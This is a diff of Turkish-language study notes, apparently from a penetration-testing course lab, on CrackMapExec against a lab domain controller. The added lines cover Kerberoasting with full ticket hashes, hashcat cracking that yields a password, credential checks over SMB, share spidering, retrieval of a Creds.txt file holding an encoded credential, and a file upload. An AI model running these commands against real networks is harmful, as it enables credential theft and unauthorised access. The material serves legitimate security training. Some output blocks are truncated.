+a55c0d3e35600a91e0bd3c8b7e2366675dd10efb1c9fdde2d5dd46b1f6e346077daf4a3757
+432921ae14c0801094c7fd2d0d50550c9a4924203e81272888ea1067f838cf306e6622102e
+4ccc885158bd0515e7ec84fa5c6f660ce7045d41e16af7e8ece1878aef72e2605e4514b118
+65bfbad3a4d788558395586ed4bbede9d0a2e106f4870bd2698f272b3ba30756fe84f44ab9
+2ee92fbcd5b7cd66dd376f4ecb6f57f63ebfa2f8e0ff7794ce6a4bd9a49018b9bc64da5349
+de833aff84d77ea5a1d6fdcb2b46986586e438535f3da26d077df2396d2b5d947a8bbfecbb
+221c7babe2881558098adc70d68b9468257381eb0639a6a532486016167f3d246c10a43612
+23b1c6f63fc9d34a749b2092a9b329761b7262259e22d8ff4a582d1f4b3c6627f5fa16684d
+e5bdafb3fefca637f83eeede7d79542f470ad850c6e7f8141bdb6f2767f9ddbe81688f1e50
+0fa59b09502eba8e733a3fd5548250299276b10365766c85a244ece2c9f0344f3b3b5953f1
+31335596f5b91fcc365ba6ed4cab1ef2f72731d8b1e459fd69915df55c710d22e583712fd2
+3999761411572089b0434782e05d364fb168eae1625b111e74351fd18ceb7186f14d25b533
+d8c8b00dbbd5b0357e9e894fa65df8ef43bcd1547ab7a01f716a1c471b3e7df0f66c31e20e
+e0e12d3d6f1deb859321a084fa819f7c8fc23cafa1cf6a19b4f65a7c7337e816b04bb1ef72
+e45031493c9a0940519d53851beb2795d477f4c64a401eefc7a3541143df11ae983ba2ff3b
+6d16580e23179bdece2fa9c4023dd71de199c94cbfbab166d0a64110e2522ff5f74c442ba0
+439a72119835f0e01422d0f8cf758b9dc906074fab81957972732f60fc26d06af9170cf5f4
+8531a5cf9cf63cd5cff0fad2f2e317588852c7df94954e2cb5b35e274de5976d33249e053c
+f23d26f45f9c9fbd418b460b5a4cb0b11fabae91bdd2113798e5401891d514cf6525419eac
+37b004487e83e6c50669d6560e07a753b86f4fb7535f3429a767e43f307dc3537eb3d808b4
+fd517c0dcc6b8cf26cb1c978f67b349fa0e4699d1b2c7325f9d1d6cf31cfe6fbf8d837b0f5
+d9b5265f9c3ccf9b79e9b88d6ab4a77297cd2866b732f1d4516541f556cd5c20dff46bfec4
+56647159017bd34d02afe2f5baee661bfa48bcfccb08d8e835be6af48a17152811d9e03222
+9c898df53082515a08c3962d4dca0dc262b758bc30fd18b36ecadc17d73141c03ae9deffcb
+2c776305a1928e0addd709a2609192f8270be7ce38936a47f21f2b1eb5a6ed27e1c76719fc
+83edffa5791064b8e77e643602fb6a459ae399ea48961e14125eba0fede24db448cfc42bb6
+90bf0d7af80fedfb440e13e61a71996fcfe29c872add3d6189e085636c4eb2c480a171b121
+5a43b438ff5ffccd6106e48e1b3
+LDAP dc01.inlanefreight.htb 389 DC01 sAMAccountName:
+peter memberOf: CN=Remote Management
+Users,CN=Builtin,DC=inlanefreight,DC=htb pwdLastSet: 2022-10-26
+06:55:58.364988 lastLogon:2022-10-26 14:45:08.305940
+LDAP dc01.inlanefreight.htb 389 DC01
+$krb5tgs$23$*peter$INLANEFREIGHT.HTB$inlanefreight.htb/peter*$eb2c68e3a589
+9ec32a9786b8ec58fe7d$f1baabf78434c380a2d7bba8c8cfae70fe520c6d7a710ee5f8754
+c1d7fcaa77b66cf26f02d3a97e8a98c3443d1791418f26c181433be3f42673ab3accfb2ed9
+ec3c67acc5269fcd31b327cc676ff3a482a7741f640e2f2918c31949297327e2c771e340a1
+ed8859e95029001313d5b948041e6ad6e8fff55cfeb09fbdf3445295b939a94601b6f28af7
+304fd2708f4f68f7568c69fce576bffe8f5db57def476123f89ea380917e5bc54e5e993717
+b4949f4de5a0c44f5e40a359bb5945feda402cca16bd0a8d85a374f16bd061e64e2bc49d35
+2fa504490260e9808e49daafef1c08390bc3f21ec3f5167a649ebb2a91b7021c9b6df26b1c
+3bc68b2e53b94e9a09861ef26cc5aa1bfcdd543fa77d4b9428a2c8ef90f6d54388ed55bbad
+930cea6193160ff58330ca083b095edab8e11ba0ce1c53a51a341222144f1f0bbf82169592
+d6537b676c54955addb6bdd9e4361fc177bff5d2bf581f24a682c0f32dd381e0d657b5caea
+b6e6b6bcffdab8e509a3f3af414ced94c9198915a0c880bea6c0b6a1818c88b24ab5c87984
+889363ef5993a190266def79c5d3ddcfecfdd3263dc83a303db8ab000a3021c1b50844e5ae
+796aa79620ff79bfe2b0347d04de8f14a48f6b4e970fdaf03efce818c13d7e7da068d9bbdc
+af361d77d5907a4b672e327f17833b2cdee523dae8a878e8d3c273bd0038c66475d00c337a
+c19df2fe8cc6e9e4e49335e30dbb4eebd3f9d24e762524d7ab6e36ab532a1924dc8a6e6049
+99e8ed3736ea1f29a3758d22f982600a0523b56780364e892014879f56fe79ce21442a4509
+cd548cdf180529ea283509bf8925b7d5275284994caef811731ba63b1cabd92368299e9364
+f3bf4d77bb7a0aec6487d0cfd776b9ee234f170a387c72ebc06aca19ed31b6d86a9986634a
+2aa3f538c51aea0db3efd26a8e7ed438c60cbb2cc5dcbb6e564c1364775f84ed9b49d65ec0
+40c6e75d4e5182a26cd86d17197212331edb0d135e7e77d3ee3277164af500e0c61d6f598b
+a1950868bf0cfd318547830a3faeb98fd40adccabd72b02733c90f8563326d65be4c707d68
+a26d4482525bbb1084b816e83772b4098a5d54a22b4c7abbc3b32fa0e9b57a5e660ae8378b
+f54e8b405a5cff00b3038bcabc40a089732de4c93a44c84446f82f19f5f17310d8963cff4c
+ee063767cb8680a5edeec3b59fcaaa1df2e05432478028a6e9346c09685febbf28ed9cbe36
+c2fcd3246f973dbc8bec55afdd0c36e140b34bd1203e61370dcdf2899ea0b88cfa6e5c562e
+08214441b4ebe7eeec4053349682bd0424cddb5c601ba681daad100ae639730a058b7b6af5
+fc5edade0f24ccac56183d01508a9fda7d7d14ccce48c9e86d3b188cd5cd67b400582b267a
+1f745a700fad067fe55f5ccca3a8655aeb28af683f9d6ccdc2eeb06d1adc2c4056bccef814
+f172dcf06f756648e4c4498ef57
+```
+
+
+Herhangi bir Kerberoastable hesabı varsa, CrackMapExec bunları çevrimdışı olarak kırmayı denememiz gereken `hash` ile birlikte görüntüler. Bizim durumumuzda, şifreyi kırmak için `rockyou.txt` kelime listesini ve Hashcat uygulamasını kullanacağız. 
 
 
 ### Cracking the Hash
-![Pasted image 20241202133720.png](/img/user/resimler/Pasted%20image%2020241202133720.png)
-![Pasted image 20241202133733.png](/img/user/resimler/Pasted%20image%2020241202133733.png)
+
+```
+hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+<SNIP>
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344386
+* Bytes.....: 139921355
+* Keyspace..: 14344386
+$krb5tgs$23$*peter$INLANEFREIGHT.HTB$inlanefreight.htb/peter*$026257d4f9aa
+58cd5c654295eac8255f$22ea3062f1822e967934263b37ff1b565342b3934c2864b46366d
+e7bf3e230d0cb08f605deae3053c6f93944256c409c9f352ac337c33f5c4ad8adf125cd686
+3598d3a8c97ec60fb19c5e3691e825f95333509fbff9e2832d465ce2beee4f290bac2c52a2
+ce625b613778a5ebebb668a2538cb547c0d0d5c45e455f5df03e08a054349fcd24e140dcb2
+315f1af23e11ebe547556a24a200585353de9e6654ec71f205a3e37fa129bede32f0ca385d
+fe7ff84cea07c8bc646147782cadb47e03b1a230c8f828a40a34d78d57513892fb1fee09a7
+888be76738374fbd3baa2050572db461221c256abafafc92e6bfc84f8c5b0771c5bb1846f0
+7b971089570b12bc8eb970a8da3f5d81f16a4353e86e8cf8ff77f834b6d9384d3e81058583
+aef8d145427bbc772f9f56153b8bc075d73841e3592ae4da6533cefb28b20186d2df253787
+10411b517b6bca5f9c1ddfed3e357a12f8ab677b963ca4aa16de76adb49068ee7d956e95ac
+04c624fef3f288640ccd260c12dddfa2771b5582e1351af1d99aa2f185687cc1613b294430
+8563afbc6d4caf9da56e61ccbf46359a3b50b1defdb8b54c4ddbcee0ce3a18b6b532ba7227
+c0918795531726e773754ee35cf3ce5b5dcf89ed8b13dd2774e6c1342e77f3fcae92065761
+95b4a48f845f193e8b949b499c14f0bf8086c73da821c183b8e9155e15e5295b7a05b49643
+3a946fecd51730150f6655e761b56b3ce0ad27884888ef88b7fd1e2fc7dd7f113cc84c684a
+976f43bdde4d3e6f8a20114da482c640dd83439b781bf6c00a73419720d1201bd5f3a9e883
+27b87cb6cf37ee88b7d5e04d51a09994b350bcbb1e3d6345293773874e3771558fea92dae0
+aa010e88372cd5520a06538c0a6c93584f6490601cc5cc1c6644974ad6e4103f027a7d3292
+4c680679478f3228c54f171920cd48272d4fcbd014acaea185f5e219a00476d8a78abcd8c3
+bdbad14f5850476c3eeb62f0817ffc5ff3467a01408c75a743a71045edfd329644683c0800
+5c7abc83e8527209b9b621488e39e9b2e5baca8247020b7e53dc1f9efa40d7d70886affa05
+90922641c31ace175df3a0ab7a8f989fa6bd7442b07b67a3d72faabec69f61a6d455d18544
+979f844ca6b64d9c3487be207e8ee80b605a2abe09221382e6574fda9e39adf03ab3687152
+af2fbb210728777b481dd7290731a0abecdfb63d72d9f9da6ac13e7b0363ab194a5e714df5
+dbac2eabacfdd6666c736ee7d074720d0860c5ed8b5c937cd12188a18b2bef1511642b5b13
+a4c5179e23e7867a9d5536e309100c8bc9a2a71b370a733fd9e972683138d08bbb5c923257
+888efc51cef997b062fca914954d91cfab3e9aafccf051c208d4149b6abc26fd1c1cc2e630
+a2f4fc0dae40e1b1ad2cd477b9feabdc9e696d43080438d9f1207b96ce7fc3a49739f4bc50
+dee57553a661778ea14cf431a0e:Password123
+<SNIP>
+
+```
 
 Hesabın parolasını aldıktan sonra, hesabın hala etkin olup olmadığını doğrulamamız gerekir. Bunu SMB protokolünü kullanarak yapabiliriz, çünkü normal bir domain kullanıcısı veya yönetici hesabı olarak kimlik doğrulaması yapmaya çalışacaktır.
 
 
 ### Testing the Account Credentials
-![Pasted image 20241202133809.png](/img/user/resimler/Pasted%20image%2020241202133809.png)
-![Pasted image 20241202133813.png](/img/user/resimler/Pasted%20image%2020241202133813.png)
 
+```
+crackmapexec smb 10.129.203.121 -u peter -p Password123
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\peter:Password123
+
+```
+
+Bir sonraki bölümde, paylaşılan klasörlerde ilginç bilgiler aramak için bulduğumuz tüm aktif hesapları nasıl kullanabileceğimizi tartışacağız.
+
+---
 
 ### Bir SMB Paylaşımında Spidering ve Önemli Bilgileri Bulma
+
 Şirketlerin, insanlar ve departmanlar arasında işbirliğini sağlamak için bilgileri merkezi bir konumda depolaması gerekir. Genellikle bir departman, başka bir departmanın işlemesi gereken bilgileri işler. Şirketlerin bu tür bir işbirliğine izin vermesinin en yaygın yollarından biri paylaşılan klasörlerdir.
 
-Erişim sağladığımız hesapları kullanarak paylaşım klasörlerine erişim talep etmek ve erişimleri olup olmadığını tespit etmek için --shares seçeneğini kullanabiliriz.
+Erişim sağladığımız hesapları kullanarak paylaşım klasörlerine erişim talep etmek ve erişimleri olup olmadığını tespit etmek için `--shares` seçeneğini kullanabiliriz.
 
 
 ### Hesapların Paylaşılan Klasörlere Erişimi Olup Olmadığını Belirleme
-![Pasted image 20241202134039.png](/img/user/resimler/Pasted%20image%2020241202134039.png)
-![Pasted image 20241202134047.png](/img/user/resimler/Pasted%20image%2020241202134047.png)
 
-Not: Bu modül yazılırken, CrackMapExec --shares seçeneği ile birden fazla kullanıcı adı ve parola sorgulamayı desteklemiyordu
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --shares
 
---shares seçeneği, hedef makinedeki her bir paylaşımı ve kullanıcımızın bu paylaşımlar üzerinde hangi izinlere (READ/WRITE) sahip olduğunu gösterir. IT adlı ilginç bir klasöre okuma ve yazma erişimimiz var. Impacket smbclient kullanarak kolayca açabilir veya paylaşımı bağlayabiliriz. Yüzlerce paylaşımın içeriğini kontrol ederken elverişsiz hale gelebilir. Bu amaçla, CrackMapExec, örümcek seçeneği ve spider_plus modülü olmak üzere iki harika özellikle birlikte gelir.
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [+] Enumerated shares
+SMB 10.129.203.121 445 DC01 Share
+Permissions Remark
+SMB 10.129.203.121 445 DC01 ----- ------
+----- ------
+SMB 10.129.203.121 445 DC01 ADMIN$
+Remote Admin
+SMB 10.129.203.121 445 DC01 C$
+Default share
+SMB 10.129.203.121 445 DC01 carlos
+SMB 10.129.203.121 445 DC01 CertEnroll READ
+Active Directory Certificate Services share
+SMB 10.129.203.121 445 DC01 D$
+Default share
+SMB 10.129.203.121 445 DC01 david
+SMB 10.129.203.121 445 DC01 IPC$ READ
+Remote IPC
+SMB 10.129.203.121 445 DC01 IT
+READ,WRITE
+SMB 10.129.203.121 445 DC01 john
+SMB 10.129.203.121 445 DC01 julio
+READ,WRITE
+SMB 10.129.203.121 445 DC01 linux01
+READ,WRITE
+SMB 10.129.203.121 445 DC01 NETLOGON READ
+Logon server share
+SMB 10.129.203.121 445 DC01 svc_workstations
+SMB 10.129.203.121 445 DC01 SYSVOL READ
+Logon server share
+SMB 10.129.203.121 445 DC01 Users
+```
+
+Not: Bu modül yazılırken, CrackMapExec `--shares` seçeneği ile birden fazla kullanıcı adı ve parola sorgulamayı desteklemiyordu
+
+`--shares` seçeneği, hedef makinedeki her bir paylaşımı ve kullanıcımızın bu paylaşımlar üzerinde hangi izinlere (READ/WRITE) sahip olduğunu gösterir. IT adlı ilginç bir klasöre okuma ve yazma erişimimiz var. [Impacket smbclient](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py) kullanarak kolayca açabilir veya paylaşımı bağlayabiliriz. Yüzlerce paylaşımın içeriğini kontrol ederken elverişsiz hale gelebilir. Bu amaçla, CrackMapExec, `spider` seçeneği ve `spider_plus` modülü olmak üzere iki harika özellikle birlikte gelir.
 
 Not: Domain'deki herhangi bir bilgisayarın bir paylaşımlı klasöre sahip olabileceğini unutmayın. Paylaşılan klasörleri bulmak için hedeflediğimiz ağda önceden tanımlanmış makineleri hedeflemeliyiz.
 
 
 ### The Spider Option
 
-CrackMapExec'teki --spider seçeneği, remote bir paylaşım içinde arama yapmanıza ve aradığınız şeye bağlı olarak ilginç dosyalar bulmanıza olanak tanır. Örneğin, -- pattern seçeneğini ve ardından aramak istediğimiz kelimeyi ekliyoruz, bu durumda txt ve üzerinde txt olan tüm dosyaları listeleyebiliriz (test.txt, atxtb.csv)
+CrackMapExec'teki `--spider` seçeneği, remote bir paylaşım içinde arama yapmanıza ve aradığınız şeye bağlı olarak ilginç dosyalar bulmanıza olanak tanır. Örneğin, `--pattern` seçeneğini ve ardından aramak istediğimiz kelimeyi ekliyoruz, bu durumda `txt` ve içinde `txt` olan tüm dosyaları listeleyebiliriz (`test.txt,` a`txtb.csv`)
 
-### “txt” İçeren Dosyaları Aramak için Örümcek Seçeneğini Kullanma
-![Pasted image 20241202135649.png](/img/user/resimler/Pasted%20image%2020241202135649.png)
-![Pasted image 20241202135656.png](/img/user/resimler/Pasted%20image%2020241202135656.png)
+### “txt” İçeren Dosyaları Aramak için spider Seçeneğini Kullanma
 
-Klasörler, dosya adları veya dosya içeriği üzerinde daha ayrıntılı aramalar yapmak için --regex [REGEX] seçeneğiyle düzenli ifadeleri de kullanabiliriz. Aşağıdaki örnekte, paylaşılan IT klasöründeki herhangi bir dosya ve dizini görüntülemek için --regex . kullanalım:
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --spider IT  --pattern txt
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [*] Started spidering
+SMB 10.129.203.121 445 DC01 [*] Spidering .
+SMB 10.129.203.121 445 DC01
+//10.129.203.121/IT/Creds.txt [lastm:'2022-10-31 11:16' size:54]
+SMB 10.129.203.121 445 DC01
+//10.129.203.121/IT/IPlist.txt [lastm:'2022-10-31 11:15' size:36]
+<SNIP>
+SMB 10.129.203.121 445 DC01 [*] Done spidering
+(Completed in 1.7534186840057373)
 
 
-### BT Paylaşımındaki Tüm Dosya ve Dizinleri Listele seçeneğini de kullanabiliriz
-![Pasted image 20241202140010.png](/img/user/resimler/Pasted%20image%2020241202140010.png)
-![Pasted image 20241202140017.png](/img/user/resimler/Pasted%20image%2020241202140017.png)
+```
 
 
-Dosya içeriğinde arama yapmak istiyorsak --content seçeneği ile bunu etkinleştirmemiz gerekir. “Encrypt” kelimesini içeren bir dosya arayalım.
+Klasörler, dosya adları veya dosya içeriği üzerinde daha ayrıntılı aramalar yapmak için      `--regex [REGEX]` seçeneğiyle regex ifadeleri de kullanabiliriz. Aşağıdaki örnekte, paylaşılan IT klasöründeki herhangi bir dosya ve dizini görüntülemek için `--regex` . kullanalım:
+
+
+### IT Paylaşımındaki Tüm Dosya ve Dizinleri Listele seçeneğini de kullanabiliriz
+
+
+```
+crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT -
+-regex .
+
+SMB 10.129.204.177 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.204.177 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 10.129.204.177 445 DC01 [*] Started spidering
+SMB 10.129.204.177 445 DC01 [*] Spidering .
+SMB 10.129.204.177 445 DC01 //10.129.204.177/IT/.
+[dir]
+SMB 10.129.204.177 445 DC01 //10.129.204.177/IT/..
+[dir]
+SMB 10.129.204.177 445 DC01
+//10.129.204.177/IT/Creds.txt [lastm:'2022-12-01 09:01' size:54]
+SMB 10.129.204.177 445 DC01
+//10.129.204.177/IT/Documents [dir]
+SMB 10.129.204.177 445 DC01
+//10.129.204.177/IT/IPlist.txt [lastm:'2022-12-01 09:01' size:36]
+SMB 10.129.204.177 445 DC01
+//10.129.204.177/IT/passwd [lastm:'2022-12-19 11:28' size:3456]
+SMB 10.129.204.177 445 DC01 
+//10.129.204.177/IT/Documents/. [dir]
+...SNIP...
+SMB 10.129.204.177 445 DC01 [*] Done spidering
+(Completed in 1.593825340270996)
+```
+
+
+Dosya içeriğinde arama yapmak istiyorsak `--content` seçeneği ile bunu etkinleştirmemiz gerekir. “`Encrypt`” kelimesini içeren bir dosya arayalım.
 
 
 ### Dosya İçeriğini Arama
-![Pasted image 20241202140711.png](/img/user/resimler/Pasted%20image%2020241202140711.png)
 
-Çok ilginç bilgiler içeren Creds.txt adlı ilginç bir dosya görebiliriz. CrackMapExec kullanarak uzaktaki bir dosyayı alabiliriz. Paylaşımı ==--share SHARENAME== seçeneğini kullanarak belirtmemiz, ardından --get-file kullanmamız ve ardından dosyanın paylaşım içindeki yolunu kullanmamız ve bir çıktı dosyası adı belirlememiz gerekir.
+```
+crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT  --content --regex Encrypt
+
+SMB 10.129.204.177 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.204.177 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 10.129.204.177 445 DC01 [*] Started spidering
+SMB 10.129.204.177 445 DC01 [*] Spidering .
+SMB 10.129.204.177 445 DC01
+//10.129.204.177/IT/Creds.txt [lastm:'2022-12-01 09:01' size:54 offset:54
+regex:'b'Encrypt'']
+SMB 10.129.204.177 445 DC01 [*] Done spidering
+(Completed in 3.5477945804595947)
+```
+
+Çok ilginç bilgiler içeren `Creds.txt` adlı ilginç bir dosya görebiliriz. CrackMapExec kullanarak remote bir dosyayı alabiliriz. Paylaşımı `--share SHARENAME` seçeneğini kullanarak belirtmemiz, ardından `--get-file` kullanmamız ve ardından dosyanın paylaşım içindeki yolunu kullanmamız ve bir çıktı dosyası adı belirlememiz gerekir.
 
 
 ### Paylaşılan Klasördeki Bir Dosyayı Alma
-![Pasted image 20241202140758.png](/img/user/resimler/Pasted%20image%2020241202140758.png)
-![Pasted image 20241202140803.png](/img/user/resimler/Pasted%20image%2020241202140803.png)
 
-![Pasted image 20241202140809.png](/img/user/resimler/Pasted%20image%2020241202140809.png)
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --
+get-file Creds.txt Creds.txt
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [*] Copy Creds.txt to
+Creds.txt
+SMB 10.129.203.121 445 DC01 [+] File Creds.txt was
+transferred to Creds.txt
+```
 
 
-Tersi durumda, uzaktaki bir paylaşıma bir dosya göndermek istediğimizi düşünün. WRITE ayrıcalıklarına sahip olduğumuz bir paylaşım bulmamız gerekir. Daha sonra --get-file ile yaptığımız gibi --put-file seçeneğini kullanabiliriz.
+```
+cat Creds.txt
+Creds Encrypted:
+ZWxpZXNlcjpTdXBlckNvbXBsZXgwMTIxIzIK
+```
+
+
+
+Tersi durumda, remote bir paylaşıma bir dosya göndermek istediğimizi düşünün. `WRITE` ayrıcalıklarına sahip olduğumuz bir paylaşım bulmamız gerekir. Daha sonra `--get-file` ile yaptığımız gibi `--put-file` seçeneğini kullanabiliriz.
 
 ### Paylaşılan Klasöre Dosya Gönderme
-![Pasted image 20241202140902.png](/img/user/resimler/Pasted%20image%2020241202140902.png)
 
-Not: Büyük bir dosya aktarıyorsak ve başarısız olursa, tekrar denediğinizden emin olun. Hata almaya devam ederseniz, --smb-timeout seçeneğini varsayılan iki (2) değerinden daha büyük bir değerle eklemeyi deneyin.
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT   --put-file /etc/passwd passwd
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [*] Copy /etc/passwd
+to passwd
+SMB 10.129.203.121 445 DC01 [+] Created file
+/etc/passwd on \\IT\passwd
+```
+
+Not: Büyük bir dosya aktarıyorsak ve başarısız olursa, tekrar denediğinizden emin olun. Hata almaya devam ederseniz, `--smb-timeout` seçeneğini varsayılan iki (2) değerinden daha büyük bir değerle eklemeyi deneyin.
 
 
 ### The spider_plus Module
 
-Bazen bir paylaşımla karşılaşabiliriz ve uzantıyla ilgili tüm dosyaları, onu monte etmeden veya smbclient.py kullanmadan hızlı bir şekilde listelemek isteyebiliriz. CrackMapExec, bunu halledecek spider_plus adlı bir modülle birlikte gelir. Varsayılan olarak bir /tmp/cme_spider_plus klasörü ve paylaşım ve dosya bilgilerini içeren bir JSON dosyası IP.json oluşturacaktır. Aracın IPC$ , NETLOGON , SYSVOL gibi paylaşımlara bakmasını önlemek için EXCLUDE_DIR modül seçeneğini kullanabiliriz.
+Bazen bir paylaşımla karşılaşabiliriz ve onu bağlamadan veya **`smbclient.py`** kullanmadan uzantıyla ilgili tüm dosyaları hızlıca listelemek isteyebiliriz. CrackMapExec, bunu halledecek **`spider_plus`** adında bir modül ile gelir. Bu modül, varsayılan olarak **`/tmp/cme_spider_plus`** adlı bir klasör ve paylaşımla ilgili dosya bilgilerini içeren **`IP.json`** adlı bir JSON dosyası oluşturur. **`EXCLUDE_DIR`** modül seçeneğini kullanarak, araçtın **`IPC$`**, **`NETLOGON`**, **`SYSVOL`** gibi paylaşımları göz ardı etmesini sağlayabiliriz.
 
 
 ### Using the Module spider_plus
-![Pasted image 20241202141200.png](/img/user/resimler/Pasted%20image%2020241202141200.png)
+
+```
+crackmapexec smb 10.129.203.121 -u grace -p 'Inlanefreight01!' -M
+spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SPIDER_P... 10.129.203.121 445 DC01 [*] Started spidering
+plus with option:
+SPIDER_P... 10.129.203.121 445 DC01 [*] DIR:
+['ipc
+
 Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:
 
 
 ### Kullanıcının Kullanabileceği Dosyaları Listeleme
-![Pasted image 20241202141228.png](/img/user/resimler/Pasted%20image%2020241202141228.png)
-![Pasted image 20241202141237.png](/img/user/resimler/Pasted%20image%2020241202141237.png)
 
+```
+{
+  "IT": {
+    "Creds.txt": {
+      "atime_epoch": "2022-10-31 11:16:17",
+      "ctime_epoch": "2022-10-31 11:15:17",
+      "mtime_epoch": "2022-10-31 11:16:17",
+      "size": "54 Bytes"
+    },
+    "IPlist.txt": {
+      "atime_epoch": "2022-10-31 11:15:11",
+      "ctime_epoch": "2022-10-31 11:14:52",
+      "mtime_epoch": "2022-10-31 11:15:11",
+      "size": "36 Bytes"
+    }
+  },
+  "linux01": {
+    "flag.txt": {
+      "atime_epoch": "2022-10-05 10:17:02",
+      "ctime_epoch": "2022-10-05 10:17:02",
+      "mtime_epoch": "2022-10-11 11:44:14",
+      "size": "52 Bytes"
+    },
+    "information-txt.csv": {
+      "atime_epoch": "2022-10-31 15:00:58",
+      "ctime_epoch": "2022-10-31 14:21:36",
+      "mtime_epoch": "2022-10-31 15:00:58",
+      "size": "284 Bytes"
+    }
+  }
+}
 
-Eğer paylaşımın tüm içeriğini indirmek istiyorsak READ_ONLY=false seçeneğini aşağıdaki gibi kullanabiliriz:
-![Pasted image 20241202141532.png](/img/user/resimler/Pasted%20image%2020241202141532.png)
+```
 
-![Pasted image 20241202141543.png](/img/user/resimler/Pasted%20image%2020241202141543.png)
+Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:
+
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SPIDER_P... 10.129.203.121 445 DC01 [*] Started spidering
+plus with option:
+SPIDER_P... 10.129.203.121 445 DC01 [*] DIR:
+['ipc
+
+```
+ls -R /tmp/cme_spider_plus/10.129.203.121/
+/tmp/cme_spider_plus/10.129.203.121/:
+IT linux01
+
+/tmp/cme_spider_plus/10.129.203.121/IT:
+Creds.txt Documents IPlist.txt
+...SNIP...
+
+/tmp/cme_spider_plus/10.129.203.121/linux01:
+flag.txt information-txt.csv
+```
 
 Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir
 
-spider_plus modülü için mevcut tüm seçenekleri görüntülemek için --options seçeneğini kullanabiliriz:
+`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:
 
 
 ### Spider_plus Options
-![Pasted image 20241202141637.png](/img/user/resimler/Pasted%20image%2020241202141637.png)
 
-Bir sonraki bölümde CrackMapExec'in bir proxy aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.
+```
+crackmapexec smb -M spider_plus --options
+
+[*] spider_plus module options:
+ READ_ONLY Only list files and put the name into a
+JSON (default: True)
+ EXCLUDE_EXTS Extension file to exclude (Default:
+ico,lnk)
+ EXCLUDE_DIR Directory to exclude (Default: print$)
+ MAX_FILE_SIZE Max file size allowed to dump (Default:
+51200)
+ OUTPUT_FOLDER Path of the remote folder where the dump
+will occur (Default: /tmp/cme_spider_plus)
+
+```
+
+Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.
+
+
+---
 
 
 ### Proxychains with CME
 
-Pivoting, Tunneling ve Port Forwarding modülünde, doğrudan erişimimiz olmayan ağlara bağlanmak için Chisel & Proxychains gibi araçları nasıl kullanacağımızı tartıştık. Bu bölümde, tehlikeye atılmış bir host üzerinden diğer ağlara nasıl saldırabileceğimizi anlamak için konsepti tekrar gözden geçireceğiz.
-
-
 ### Scenario
-Dahili bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit ettik ve tehlikeye attık. Ele geçirilen bu host üzerinde ipconfig çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu 172.16.1.10 IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:
+
